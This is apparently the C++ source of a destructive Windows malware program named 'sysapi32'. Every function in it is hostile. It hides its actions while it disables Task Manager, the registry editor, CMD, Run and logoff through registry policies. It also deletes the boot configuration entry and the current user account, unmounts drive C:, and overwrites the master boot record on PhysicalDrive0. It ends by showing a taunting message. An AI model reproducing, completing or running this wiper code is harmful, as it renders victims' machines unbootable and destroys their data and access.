#include "bootrec.hpp"

/* what */;

void DisableSystemTools() {
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\Software\\Policies\\Microsoft\\Windows\\system /v DisableCMD /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hklm\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v HideFastUserSwitching /t reg_dword /d 1 /f", NULL, SW_HIDE);
	ShellExecuteA(NULL, "open", "reg", "add hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoLogoff /t reg_dword /d 1 /f", NULL, SW_HIDE);
}

void CorruptBootConfig() {
	ShellExecuteA(NULL, "open", "bcdedit", "/delete {current}", NULL, SW_HIDE);
}

void DeleteUser() {
	ShellExecuteA(NULL, "open", "net", "user %username% /delete", NULL, SW_HIDE);
}

void FormatDisk() {
	ShellExecuteA(NULL, "open", "mountvol", "c: /d", NULL, SW_HIDE);
}

void HideTaskbar() {
	ShowWindow(FindWindowA("Shell_TrayWnd", NULL), SW_HIDE);
}

void OverwriteBootRecord() {
	DWORD dwbytes;
	HANDLE mbr = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (mbr == INVALID_HANDLE_VALUE) {
		MessageBoxA(NULL, "An error occurred while trying to open the hard drive.", "sysapi32.exe - Hard Drive Management Failed", MB_ICONERROR);
		CloseHandle(mbr);
		ExitProcess(0);
	}
	if (!WriteFile(mbr, bootrecord, 65536, &dwbytes, 0)) {
		MessageBoxA(NULL, "An error occurred while trying to write to the boot sector.", "sysapi32.exe - Boot Sector Error", MB_ICONERROR);
		CloseHandle(mbr);
		ExitProcess(0);
	}
}

DWORD __stdcall message(LPVOID lpvoid) {
	MessageBoxA(NULL, "This PC has been corrupted by sysapi32.\r\nEnjoy using your new PC!", "sysapi32", MB_OK | MB_ICONASTERISK);
	return 0;
}


// thread

void dt(HANDLE h) {
	TerminateThread(h, 0);
	CloseHandle(h);
}
